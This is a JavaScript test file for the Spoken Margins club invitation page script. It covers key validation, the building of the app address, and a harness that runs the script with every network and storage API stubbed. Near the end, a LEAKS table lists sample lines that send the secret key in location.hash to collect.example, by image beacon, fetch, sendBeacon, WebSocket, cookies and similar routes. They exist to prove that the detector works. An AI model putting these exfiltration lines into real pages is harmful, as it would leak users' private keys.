// The club invitation page's script (#1799 slice 4). The shell is the one clubs/page.go writes: the ids the script
// reads are checked against the Go output by TestClubPageShellHasWhatTheScriptReads in internal/api.
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import test from 'node:test';
import { parseHTML } from 'linkedom';
import { CUT_OFF_MESSAGE, openInAppAddress, showInvite } from './club-page.mjs';

const ID = '586bb2e6e140f06e7397a7f3453dcfaa';
const HOST = 'spokenmargins.com';
// 32 bytes as unpadded base64url, the shape the app writes for a share link's key, and the club invite will.
const KEY = Buffer.from(Array.from({ length: 32 }, (_, i) => (i * 7 + 3) % 256)).toString('base64url');
const SHELL = `<!doctype html><html><body><main id="club" data-club="${ID}"><p id="status" role="status">fallback words</p><p><a id="open" href="spokenmargins://club" hidden>Open in Spoken Margins</a></p></main></body></html>`;

test('the test key has the shape the app writes', () => {
  assert.equal(KEY.length, 43);
  assert.doesNotMatch(KEY, /[=+/]/);
});

test('a real invite becomes the app address, with the whole https link inside', () => {
  const address = openInAppAddress(ID, HOST, `#${KEY}`);
  assert.equal(address, `spokenmargins://club?link=${encodeURIComponent(`https://${HOST}/c/${ID}#${KEY}`)}`);
  const link = new URL(address).searchParams.get('link');
  assert.equal(link, `https://${HOST}/c/${ID}#${KEY}`);
});

test('padding a messaging app added is carried through unchanged', () => {
  assert.ok(openInAppAddress(ID, HOST, `#${KEY}=`));
  assert.ok(openInAppAddress(ID, HOST, `#${KEY}==`));
});

test('a missing, cut short or damaged key gives no address', () => {
  const bad = [
    '', '#', `${KEY}`, `#${KEY.slice(0, 42)}`, `#${KEY}0`, `#${KEY.slice(0, 42)}!`, `#${KEY.slice(0, 42)}+`,
    `#${KEY.slice(0, 42)}/`, `# ${KEY.slice(0, 42)}`, `#${KEY}&x=1`, `#${KEY}\n`, `#${KEY}#${KEY}`, `#${KEY}%61`,
    undefined, null, 5,
  ];
  for (const hash of bad) assert.equal(openInAppAddress(ID, HOST, hash), undefined, JSON.stringify(hash));
});

test('an id that is not a club id, or a host that is not a plain host, gives no address', () => {
  for (const id of ['', ID.slice(1), `${ID}0`, ID.toUpperCase(), `${ID.slice(1)}g`, `${ID}/../x`, undefined, null]) {
    assert.equal(openInAppAddress(id, HOST, `#${KEY}`), undefined, JSON.stringify(id));
  }
  for (const host of ['', 'a.test:8443', 'user@a.test', 'A.test', 'a.test/x', 'a.test?x', 'a b', undefined, null]) {
    assert.equal(openInAppAddress(ID, host, `#${KEY}`), undefined, JSON.stringify(host));
  }
});

test('nothing but the id and the key reaches the app address', () => {
  // The caller passes the address parts, not the address, so a query on the page can never be forwarded.
  const address = openInAppAddress(ID, HOST, `#${KEY}`);
  assert.doesNotMatch(decodeURIComponent(address), /\?(?!link=)/);
  assert.equal(new URL(address).searchParams.size, 1);
  assert.equal(new URL(decodeURIComponent(new URL(address).searchParams.get('link'))).search, '');
});

test('the page shows the open button when the address has a key', () => {
  const { document } = parseHTML(SHELL);
  assert.equal(showInvite(document, { host: HOST, hash: `#${KEY}` }), '');
  const open = document.getElementById('open');
  assert.equal(open.hasAttribute('hidden'), false);
  assert.equal(open.getAttribute('href'), openInAppAddress(ID, HOST, `#${KEY}`));
  assert.equal(document.getElementById('status').textContent, '', 'the script replaces the fallback words');
});

test('the page keeps the button hidden and says the link is cut off when the key is missing', () => {
  for (const hash of ['', '#', `#${KEY.slice(0, 20)}`]) {
    const { document } = parseHTML(SHELL);
    assert.equal(showInvite(document, { host: HOST, hash }), CUT_OFF_MESSAGE);
    const open = document.getElementById('open');
    assert.equal(open.hasAttribute('hidden'), true);
    assert.equal(open.getAttribute('href'), 'spokenmargins://club');
    assert.equal(document.getElementById('status').textContent, CUT_OFF_MESSAGE);
  }
});

test('the cut-off sentence matches the share page and the web app', () => {
  const share = readFileSync(new URL('../links/share-link-page.mjs', import.meta.url), 'utf8');
  const match = /export const CUT_OFF_MESSAGE = '([^']+)'/.exec(share);
  assert.ok(match);
  assert.equal(CUT_OFF_MESSAGE, match[1]);
});

test('a shell with no club id shows no button', () => {
  const { document } = parseHTML(SHELL.replace(`data-club="${ID}"`, ''));
  assert.equal(showInvite(document, { host: HOST, hash: `#${KEY}` }), CUT_OFF_MESSAGE);
  assert.equal(document.getElementById('open').hasAttribute('hidden'), true);
});

// The script runs for real, in a page where every way out records itself: a stub for each network, timer, storage and
// window API, and an exact expected page, so an element or attribute the script adds shows even when it carries the key
// in an encoded form. A text search for banned words passes a one-line `new Image().src = '...' + location.hash`; this
// does not (#4317). Dynamic import() has no stub, so the script may contain no `import` at all (checked below), and the
// page's CSP (default-src 'none', pinned by the Go test TestClubPageKeepsTheSecurityHeadersAndFetchesNothing) is the
// second layer for what no stub can see.
const SCRIPT = new URL('./club-page.mjs', import.meta.url);
const FUNCTIONS = ['fetch', 'XMLHttpRequest', 'Image', 'Audio', 'Option', 'WebSocket', 'EventSource', 'Worker', 'SharedWorker', 'Request', 'BroadcastChannel', 'WebTransport', 'RTCPeerConnection', 'Notification', 'open', 'importScripts', 'postMessage', 'setTimeout', 'setInterval', 'setImmediate', 'queueMicrotask', 'requestAnimationFrame', 'requestIdleCallback', 'structuredClone', 'eval', 'Function'];
const OBJECTS = ['localStorage', 'sessionStorage', 'indexedDB', 'caches', 'history', 'navigator', 'cookieStore', 'serviceWorker', 'performance'];
const GLOBALS = ['document', 'location', 'window', 'self', 'top', 'parent', ...FUNCTIONS, ...OBJECTS];

async function runScript(source, label) {
  const dir = mkdtempSync(join(tmpdir(), 'club-page-'));
  const file = join(dir, `${label}.mjs`);
  writeFileSync(file, source);
  const calls = [];
  const realTimeout = globalThis.setTimeout;
  // Whatever the script does with a stub (call it, construct it, read a member, assign one) is recorded.
  const anything = (name) => new Proxy(function () {}, {
    get: (_, p) => (p === 'then' || p === Symbol.toPrimitive ? undefined : anything(`${name}.${String(p)}`)),
    set(_, p, v) { calls.push(`${name}.${String(p)} = ${v}`); return true; },
    apply(_, __, args) { calls.push(`${name}(${args.map(String).join(', ')})`); return anything(name); },
    construct(_, args) { calls.push(`new ${name}(${args.map(String).join(', ')})`); return anything(name); },
  });
  const saved = Object.fromEntries(GLOBALS.map((g) => [g, Object.getOwnPropertyDescriptor(globalThis, g)]));
  const { document } = parseHTML(SHELL);
  for (const m of ['createElement', 'createElementNS', 'write', 'writeln']) {
    const real = document[m]?.bind(document);
    document[m] = (...args) => { calls.push(`document.${m}(${args.map(String).join(', ')})`); return real?.(...args); };
  }
  Object.defineProperty(document, 'cookie', { get() { calls.push('document.cookie read'); return ''; }, set(v) { calls.push(`document.cookie = ${v}`); }, configurable: true });
  const location = new Proxy({ host: HOST, hash: `#${KEY}`, search: '', pathname: `/c/${ID}` }, {
    set(_, prop, value) { calls.push(`location.${String(prop)} = ${value}`); return true; },
    get(target, prop) { return prop in target ? target[prop] : anything(`location.${String(prop)}`); },
  });
  Object.defineProperty(document, 'location', { get: () => location, set(v) { calls.push(`document.location = ${v}`); }, configurable: true });
  const windowStub = new Proxy({}, {
    get(_, p) { return p === 'location' ? location : p === 'document' ? document : anything(`window.${String(p)}`); },
    set(_, p, v) { calls.push(p === 'location' ? `window.location = ${v}` : `window.${String(p)} = ${v}`); return true; },
  });
  const stubs = { document, location, window: windowStub, self: windowStub, top: windowStub, parent: windowStub };
  for (const name of [...FUNCTIONS, ...OBJECTS]) stubs[name] = anything(name);
  try {
    for (const [name, value] of Object.entries(stubs)) Object.defineProperty(globalThis, name, { value, configurable: true, writable: true });
    await import(pathToFileURL(file).href);
    await new Promise((resolve) => realTimeout(resolve, 20));
  } finally {
    for (const g of GLOBALS) {
      if (saved[g]) Object.defineProperty(globalThis, g, saved[g]); else delete globalThis[g];
    }
    rmSync(dir, { recursive: true, force: true });
  }
  return { calls, html: document.documentElement.outerHTML };
}

/** The page after the script has done its one job: the open button shown with the app address, the fallback words gone. */
function expectedPage() {
  const { document } = parseHTML(SHELL);
  const open = document.getElementById('open');
  open.setAttribute('href', openInAppAddress(ID, HOST, `#${KEY}`));
  open.removeAttribute('hidden');
  document.getElementById('status').textContent = '';
  return document.documentElement.outerHTML;
}

const PRISTINE = readFileSync(SCRIPT, 'utf8');
// No comments, so a banned word in prose does not trip the search and a comment cannot hide one from it.
const CODE = PRISTINE.replace(/\/\*[\s\S]*?\*\//g, ' ').replace(/^\s*\/\/.*$/gm, '');

test('the script makes no request and keeps nothing, run for real', async () => {
  const { calls, html } = await runScript(PRISTINE, 'pristine');
  assert.deepEqual(calls, []);
  assert.equal(html, expectedPage(), 'the page is the shell plus the open address and nothing else');
});

// A guard that cannot fail is the finding in #4317, so the harness is shown a script that leaks the key by each route.
const LEAKS = {
  'an image beacon': "new Image().src = 'https://collect.example/?k=' + location.hash;",
  fetch: "fetch('https://collect.example/?k=' + location.hash);",
  XMLHttpRequest: "new XMLHttpRequest().open('GET', 'https://collect.example/?k=' + location.hash);",
  sendBeacon: "navigator.sendBeacon('https://collect.example/', location.hash);",
  'window.open': "window.open('https://collect.example/?k=' + location.hash);",
  'a location assignment': "location.href = 'https://collect.example/?k=' + location.hash;",
  'location.assign': "location.assign('https://collect.example/?k=' + location.hash);",
  'window.location': "window.location = 'https://collect.example/?k=' + location.hash;",
  'document.location': "document.location = 'https://collect.example/?k=' + location.hash;",
  'window.name': "window.name = location.hash;",
  'a <link> element': "document.head?.appendChild(document.createElement('link'));",
  'an <img> through innerHTML': "document.getElementById('status').innerHTML += '<img src=\"https://collect.example/?k=' + location.hash + '\">';",
  'an <img> with the key encoded': "document.getElementById('status').innerHTML += '<img src=\"https://collect.example/?k=' + btoa(location.hash) + '\">';",
  'an <img> inserted next to the button': "document.getElementById('open').insertAdjacentHTML('afterend', '<img src=\"https://collect.example/?k=' + location.hash + '\">');",
  'a ping attribute': "document.getElementById('open').setAttribute('ping', 'https://collect.example/?k=' + location.hash);",
  WebSocket: "new WebSocket('wss://collect.example/' + location.hash.slice(1));",
  BroadcastChannel: "new BroadcastChannel('k').postMessage(location.hash);",
  'a later timer': "setTimeout(() => fetch('https://collect.example/?k=' + location.hash), 100);",
  'a storage write': "localStorage.setItem('k', location.hash);",
  cookie: "document.cookie = 'k=' + location.hash;",
};

for (const [name, leak] of Object.entries(LEAKS)) {
  test(`the run-for-real check catches a script that leaks the key by ${name}`, async () => {
    const label = name.replace(/\W+/g, '-');
    const { calls, html } = await runScript(`${PRISTINE}\n${leak}\n`, label);
    assert.ok(calls.length > 0 || html !== expectedPage(), `nothing noticed: ${leak}`);
  });
}

test('a timer a leaking script set does not fire after its run and spoil a later test', async () => {
  const before = (await runScript(`${PRISTINE}\n${LEAKS['a later timer']}\n`, 'timer')).calls;
  assert.ok(before.some((c) => c.startsWith('setTimeout(')));
  assert.deepEqual((await runScript(PRISTINE, 'after-timer')).calls, []);
});

test('the script has no import, dynamic or otherwise, and no word the run cannot stub', () => {
  assert.doesNotMatch(CODE, /\bimport\b/, 'import() reaches the server with the key in its address and has no stub');
  for (const banned of ['fetch', 'XMLHttpRequest', 'sendBeacon', 'WebSocket', 'localStorage', 'sessionStorage', 'cookie', 'location.replace', 'location.assign', 'innerHTML', 'insertAdjacentHTML', 'Image', 'window.', 'navigator', 'createElement', 'setTimeout', 'eval']) {
    assert.ok(!CODE.includes(banned), banned);
  }
});
